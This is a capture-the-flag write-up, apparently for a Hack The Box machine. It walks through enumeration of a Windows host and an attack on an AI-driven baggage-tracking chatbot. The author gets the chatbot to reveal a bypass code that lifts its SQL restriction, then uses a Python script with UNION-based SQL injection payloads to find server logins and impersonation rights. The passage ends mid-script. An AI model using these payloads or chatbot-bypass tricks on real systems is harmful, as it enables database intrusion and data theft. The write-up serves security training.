
![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/74c402f7-390d-4da7-9db5-726e4fe731cb/a2ccc1a4-1b09-482d-adae-2f88e7246c4b-1793108763.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=49df4fa89887d5ebff451746d3e219f87d3775f0e38773f910d9e4651302dc03&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



## Introduction



### Port Scan



```bash:command
nmap -sCV 10.129.206.189 -oA nmap/Unclaimed 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 10:49 +0300
Nmap scan report for 10.129.206.189
Host is up (0.21s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-14T07:50:40
|_  start_date: N/A
|_clock-skew: 10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.55 seconds

```


I will start off with a nmap scan to identify open ports and running services. Key findings:

- 80 : HTTP

- 139 : SMB

- 5985 : WINRM

- OS : Windows

- SMB Signing : enabled and required


## SMB Enumeration



```bash:command
nxc smb 10.129.206.189
SMB         10.129.206.189  445    UNCLAIMED        [*] Windows 11 / Server 2025 Build 26100 x64 (name:UNCLAIMED) (domain:unclaimed) (signing:True) (SMBv1:None)
```


I manage to get the domain name and host name of the host. Also I don’t have any credentials and the guest accounts don’t have access


```bash:command
echo '10.129.206.189  UNCLAIMED.unclaimed unclaimed UNCLAIMED' | sudo tee -a /etc/hosts
```


I will add the domain name to my host file for dns resolution


## HTB Airlines 



![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/c08d7c03-093b-44a3-8046-7b86cb36f1b8/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=3f7a53afdea2f5866ff66db9b4fc80a16e2d8e613a6704530434b3eb73a21b89&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


After adding unclaimed,htb to my hosts file for dns resolution I get the HTB airlines website that is used to look for lost or delayed baggages and an input form at the bottom


![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/052a9e21-04e1-4e78-93eb-8b0c82499565/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=99c1f19dd3de2183b864a66dd457b80bfdd653b1905e21d7ef4a40646e8f2609&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


Inputing some input I get that the tracebot is using an SQL Query to look for the baggages. 


```bash:command

```


I will perform a directory brute force with feroxbuster to identify hidden directories.


```bash:command

```


I also perform a subdomain enumeration with ffuf


![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/b744c501-2977-4024-8b2c-c6d9947d3be8/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=98b871434672308dac0ede4fb242ef66f17046d2c26e8beaaa0f689bea9172bc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


I go ahead and capture the request in burp. When I sent message it replied that that doesn’t indicate a valid SQL query so  the tracebot converts the query into SQL , Posts them to /ask.


![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/a68d07fa-de88-4491-856b-2a4d8b87bc06/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=0822f86794670736f5a49533df4f332276225f14997a480940e72708d6455e44&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


When I try abitirary SQL code its fails stating that it can’t run the code.


![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/c02f776b-c146-49ba-a60a-90f7554c7aa1/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=18b1ccd9fcd0cadacdaaa3d7794b43288df75c25645a28def6d39ec003f87a87&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


When I ask for the bypass code I get it as HTB-OPS-4471


![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/a97a22a5-5b93-4567-975a-088fce1a2468/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=7d57353cf74965929eecbc3fcdedc25eb97f8f7bc03b875bdd66c7462100e268&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


With the code prepended before running and I get SQL injection working


![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/6dea6e12-115a-4981-822d-bec55a203ec7/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=b5e5bc2f417ad95ce9e909e1350f000417f53b19a7f683768f28ce8b8fa8465c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


I don’t get any interesting information inside the tables


![Exploitation Screenshot](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ab8e823-0bc9-81c8-9d0d-000312de7942/10046cc2-751d-47d7-8bb7-8630d876f808/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SPLZQGTJ%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T193358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDoaCXVzLXdlc3QtMiJHMEUCIH85LYJQDsVVXpl%2Fu96YgBGaZNaISXGsKNvXYCKSNzs1AiEAx2rt63L1INsF5PIIBEQf8d3EoX9YPV3ibC9scmAgdkgq%2FwMIAxAAGgw2Mzc0MjMxODM4MDUiDMcu8Fcenzx1quVKByrcA8xZnTrGZdo5BzJJnuHjAOc5cdp9%2BF63z804pMbrLcWc7MvNgmKAP1fq3CuMwAxKvHbQZpBHRce9iUuvNYsjR%2FAv1m1CM3yIBEl179Ink9zBOHAiJPDkM%2BmbaFdOrAa6m1GxvUMIgWtepXgqNToscsLiCId75rOTO7p2dDlBceKWQ8z0cgiuJ7oDPRuUTxBh0u5zpDk%2Bdf8VNhmSSX49NIhVlf4Y3yWWUpdkVWIXkaLxZwTzEgs8SXE%2BQ50hz7AMBbTGZF118AOR7nb38nKfN7sesoj8a3F7Ws4sui9vjss%2BwH1nFSlyjieWswA%2BNg%2FS1hJr7HiIEcCYS3CgNravMzq5UT41XChXwEkItsBX6KM0BeExoAGUTLhPL1meq6Q0a1bvnALdgTVaIxFHbodb2JNBdeYZ07Ynv5hQePYwFfKdJA5zd5TW0w3Eq6E2fTcJBxWDNzcvL5vzIFfkU5Q4anV9g77EPkmZl0%2Bdt8rvmkvRvP5ctGLBv8IT52spsPBMBOgYT%2FxGyJ4%2FH5fkf35sbBU0ZAtxMUz5bCYojKYypAag79Q8wlGXCY%2FC%2FMMS9Xj7vsiJWH7tb%2BXgvrJ3QS7kN5U%2BYT436ee%2Baog5N%2BzaJdZ6cuemq7ucBii5cdF0MK3I99cGOqUBtiSa3aYzbN9nJMzKXz5RnCjZZChXCPFYx3VmEly4uvW67VhxJzsIfX5nZa93XFfc%2BApo96Fi3vz0yu0cV4M0fDDtKsYThOhwUiAQ93tjEmZ19ZYtNEu7yVWoO0Ar8DRST8pGwnNXYlhrZAU7P3HIVBEgv4NP98C%2FO9%2BHLjbZ722G8H4KrvOoQ4zyAlQzvHf3v8Tl6jwosHF3GkZAv1APoi9L5bC0&X-Amz-Signature=08a364a6a69f0d96c4b2d8101ef758e6f252ade36ef0ccaf3e931ad5c31daf31&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


I also get the current user am logged in as.


```python:command
import requests
import json

URL = "http://unclaimed.htb/ask"
HEADERS = {
    "Host": "unclaimed.htb",
    "Content-Type": "application/json",
    "Origin": "http://unclaimed.htb"
}

def run_query(payload):
    # We put your payload in the SECOND column (NULL, {payload}, NULL)
    # and automatically CAST it to VARCHAR so it doesn't crash.
    # If you just type @@version, it becomes: CAST(@@version AS VARCHAR)
    
    safe_payload = f"CAST(({payload}) AS VARCHAR)"
    full_payload = f"' UNION SELECT NULL, {safe_payload}, NULL -- -"
    
    data = {"msg": f"HTB-OPS-4471 {full_payload}"}
    
    try:
        response = requests.post(URL, headers=HEADERS, json=data, timeout=10)
        return response.json()
    except Exception as e:
        return {"error": str(e)}

while True:
    user_input = input("SQLi> ")
    if user_input.lower() in ['exit', 'quit']:
        break
    if not user_input.strip():
        continue

    resp_json = run_query(user_input)
    
    if "error" in resp_json:
        print(f"[!] Error: {resp_json['error']}")
    else:
        reply_text = resp_json.get("reply", "")
        if "The query returned" in reply_text:
            # The output is now in column2 instead of column1
            print("\n" + reply_text.split("\n\n")[-1] + "\n")
        else:
            print(f"\n{json.dumps(resp_json, indent=2)}\n")
```


I write a small python script to automate the process.


```bash:command
python3 sql.py
SQLi> SUSER_SNAME() + ' | Role: ' + CAST(IS_SRVROLEMEMBER('sysadmin') AS VARCHAR)

| column1 | column2 | column3 |
| --- | --- | --- |
|  | svc_tracer_ro | Role: 0 |  |

SQLi> 

```


With the script I find that am not an admin


```bash:command
SQLi> (SELECT STRING_AGG(name, ', ') FROM sys.server_principals WHERE principal_id IN (SELECT major_id FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE' AND grantee_principal_id = (SELECT principal_id FROM sys.server_principals WHERE name = 'svc_tracer_ro')))

| column1 | column2 | column3 |
| --- | --- | --- |
|  | svc_reports |  |

SQLi>
```


I get that I can now impersonate svc_reports.


```bash:command
import requests, json
URL = "http://unclaimed.htb/ask"
HEADERS = {"Content-Type": "application/json", "Origin": "http://unclaimed.htb"}

def run_raw(sql):
    # We break out of the original query with ' and append -- - to comment the rest
    data = {"msg": f"HTB-OPS-4471 ' {sql} -- -"}
    try:
        r = requests.post(URL, headers=HEADERS, json=data, timeout=10)
        print(json.dumps(r.json(), indent=2))
    except Exception as e:
        print(f"Error: {e}")

while True:
